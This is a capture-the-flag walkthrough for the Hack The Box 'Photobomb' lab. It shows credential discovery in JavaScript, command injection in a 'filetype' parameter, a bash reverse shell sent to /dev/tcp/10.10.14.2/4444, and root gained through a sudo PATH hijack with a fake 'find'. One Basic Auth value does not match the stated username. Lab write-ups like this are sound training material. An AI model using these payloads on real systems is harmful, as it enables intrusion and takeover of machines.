# 📸 HTB Photobomb – Walkthrough (Easy Linux)

## 01 – Enumeration

### 🔍 Nmap Scan

**Command:**

```bash
nmap -sC -sV -oA nmap/photobomb 10.10.11.182
```

**Result:**

- `22/tcp` – OpenSSH 8.9p1 (Ubuntu 3ubuntu0.1)
    
- `80/tcp` – nginx 1.18.0 (Ubuntu)
    
- Virtual host: `photobomb.htb`
    

**Action:** Add the hostname to `/etc/hosts`

```bash
sudo nano /etc/hosts
```

Add this line:

```
10.10.11.182    photobomb.htb
```

### 🧠 Key Findings

- SSH is open – potential access vector after exploitation.
    
- The web server serves content for `photobomb.htb`, not just the IP.
    

---

## 02 – Initial Access

### 🔐 Discovered Credentials

While viewing the page source (`Ctrl+U`), a script tag references `photobomb.js`. Inside the JS code:

```javascript
// Jameson: pre-populate creds for tech support...
document.getElementsByClassName('creds')[0].setAttribute(
  'href',
  'http://pH0t0:b0Mb!@photobomb.htb/printer'
);
```

**Credentials:**

- Username: `pH0t0`
    
- Password: `b0Mb!`
    

**Login URL:**

```
http://photobomb.htb/printer
```

### ✅ Access Confirmed

This endpoint is protected via **Basic Auth**. After logging in, it reveals a photo download panel with options to:

- Set dimensions (e.g., 30x20)
    
- Select file type (e.g., JPG, PNG)
    
- Submit download
    

---

### 🧠 Observations

- The image download triggers backend processing (likely ImageMagick or similar)
    
- Parameters in the POST request may be vulnerable to injection
    

**Next:** Use **Burp Suite** to intercept and test for vulnerabilities in form parameters.

---

## 03 – Exploitation: Remote Code Execution (RCE)

### 🔎 Testing with Burp

When intercepting the request in Burp, we noticed:

```
POST /printer HTTP/1.1
Host: photobomb.htb
Authorization: Basic cEgwdDBiOmIwTWIh
Content-Type: application/x-www-form-urlencoded

photo=1337&filetype=jpg;id
```

- Adding `;id` to `filetype` executed system command `id`
    

➡️ **This confirms a command injection vulnerability.**

---

### 🔙 Gaining Reverse Shell

**Reverse shell payload (Bash):**

```bash
filetype=jpg;bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
```

Start listener on attacker machine:

```bash
nc -lvnp 4444
```

After submission, a shell is received as user `wizard`:

```bash
wizard@photobomb:~/photobomb$
```

To stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 04 – Privilege Escalation

### 🔍 Sudo Permissions

```bash
sudo -l
```

```
User wizard may run the following command:
  (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

➡️ We can run `/opt/cleanup.sh` as root with custom environment variables.

### 🔍 Script Analysis

```bash
cat /opt/cleanup.sh
```

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]; then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

**Notice:** The script uses `find` without full path. We can hijack it via `$PATH`.

---

### 🚀 Exploiting PATH Hijack

1. Create malicious `find` in `/dev/shm`
    

```bash
cd /dev/shm
echo -e '#!/bin/bash\nbash' > find
chmod +x find
```

2. Run cleanup script with manipulated PATH:
    

```bash
sudo PATH=/dev/shm:$PATH /opt/cleanup.sh
```

➡️ Root shell gained ✅

```bash
root@photobomb:/home/wizard/photobomb#
```

---

## 🏁 Flags

### 🧑‍💻 User Flag

```bash
cat /home/wizard/user.txt
```

```
HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

### 👑 Root Flag

```bash
cat /root/root.txt
```

```
HTB{yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy}
```

---

## ✅ Summary

- Initial foothold via credentials found in JS
    
- Command injection in `filetype` param → reverse shell
    
- `sudo` rights on `cleanup.sh` using `find` → PATH hijack → root
    
- Optional: Advanced method with `enable -n` and `BASH_ENV`
    

---

🎯 **Machine pwned.**
